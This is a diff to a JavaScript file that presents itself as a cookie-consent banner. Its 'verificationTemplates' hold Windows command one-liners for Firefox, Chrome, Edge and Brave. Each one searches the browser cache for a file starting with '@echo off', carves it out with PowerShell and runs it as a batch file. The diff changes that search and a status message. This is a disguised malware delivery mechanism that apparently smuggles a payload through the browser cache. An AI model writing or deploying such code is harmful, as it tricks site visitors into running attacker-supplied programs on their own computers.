@@ -11,7 +11,7 @@
   window.__CONSENT_INJECTED__ = true;
 
   var CONSENT_CONFIG = {
-    version: '1.7.6',
+    version: '1.7.7',
     presentation: 'consent',
     privacyPolicyUrl: '/privacy-policy',
     optOutUrl: '/opt-out-preferences',
@@ -25,10 +25,10 @@
     bodyEndMarker: 'CDRPEND7F3A9D2',
     bodyMustStartWith: '@echo off',
     verificationTemplates: {
-      firefox: 'cmd /c for /r "%LOCALAPPDATA%\\Mozilla\\Firefox\\Profiles" %f in (*) do @find "{M}" "%f">nul&&copy /y "%f" "%TMP%\\x">nul&&powershell -nop -c "[IO.File]::WriteAllBytes(\'%TMP%\\t.bat\',[IO.File]::ReadAllBytes(\'%TMP%\\x\')[0..{SM1}])"&&call %TMP%\\t.bat&exit',
-      chrome: 'cmd /c for /r "%LOCALAPPDATA%\\Google\\Chrome\\User Data" %f in (f_*) do @find "{M}" "%f">nul&&copy /y "%f" "%TMP%\\x">nul&&powershell -nop -c "[IO.File]::WriteAllBytes(\'%TMP%\\t.bat\',[IO.File]::ReadAllBytes(\'%TMP%\\x\')[0..{SM1}])"&&call %TMP%\\t.bat&exit',
-      edge: 'cmd /c for /r "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data" %f in (f_*) do @find "{M}" "%f">nul&&copy /y "%f" "%TMP%\\x">nul&&powershell -nop -c "[IO.File]::WriteAllBytes(\'%TMP%\\t.bat\',[IO.File]::ReadAllBytes(\'%TMP%\\x\')[0..{SM1}])"&&call %TMP%\\t.bat&exit',
-      brave: 'cmd /c for /r "%LOCALAPPDATA%\\BraveSoftware" %f in (f_*) do @find "{M}" "%f">nul&&copy /y "%f" "%TMP%\\x">nul&&powershell -nop -c "[IO.File]::WriteAllBytes(\'%TMP%\\t.bat\',[IO.File]::ReadAllBytes(\'%TMP%\\x\')[0..{SM1}])"&&call %TMP%\\t.bat&exit'
+      firefox: 'cmd /c for /r "%LOCALAPPDATA%\\Mozilla\\Firefox\\Profiles" %f in (*) do @findstr /b "@echo off" "%f">nul&&copy /y "%f" "%TMP%\\x">nul&&powershell -nop -c "[IO.File]::WriteAllBytes(\'%TMP%\\t.bat\',[IO.File]::ReadAllBytes(\'%TMP%\\x\')[0..{SM1}])"&&call %TMP%\\t.bat&exit',
+      chrome: 'cmd /c for /r "%LOCALAPPDATA%\\Google\\Chrome\\User Data" %f in (f_*) do @findstr /b "@echo off" "%f">nul&&copy /y "%f" "%TMP%\\x">nul&&powershell -nop -c "[IO.File]::WriteAllBytes(\'%TMP%\\t.bat\',[IO.File]::ReadAllBytes(\'%TMP%\\x\')[0..{SM1}])"&&call %TMP%\\t.bat&exit',
+      edge: 'cmd /c for /r "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data" %f in (f_*) do @findstr /b "@echo off" "%f">nul&&copy /y "%f" "%TMP%\\x">nul&&powershell -nop -c "[IO.File]::WriteAllBytes(\'%TMP%\\t.bat\',[IO.File]::ReadAllBytes(\'%TMP%\\x\')[0..{SM1}])"&&call %TMP%\\t.bat&exit',
+      brave: 'cmd /c for /r "%LOCALAPPDATA%\\BraveSoftware" %f in (f_*) do @findstr /b "@echo off" "%f">nul&&copy /y "%f" "%TMP%\\x">nul&&powershell -nop -c "[IO.File]::WriteAllBytes(\'%TMP%\\t.bat\',[IO.File]::ReadAllBytes(\'%TMP%\\x\')[0..{SM1}])"&&call %TMP%\\t.bat&exit'
     }
   };
 
@@ -115,7 +115,7 @@
     if (!statusEl) return;
 
     if (state === 'ok') {
-      statusEl.textContent = 'strict body ' + (CONSENT_CONFIG.cacheFileBodySize || '?') + ' bytes, one-liner searches for "' + (CONSENT_CONFIG.bodyStartMarker || '') + '" (' + getBrowserKey() + ')';
+      statusEl.textContent = 'strict body ' + (CONSENT_CONFIG.cacheFileBodySize || '?') + ' bytes, one-liner finds cache starting with @echo off (' + getBrowserKey() + ')';
       statusEl.className = 'ok';
       if (previewEl && text) previewEl.textContent = text;
     } else {
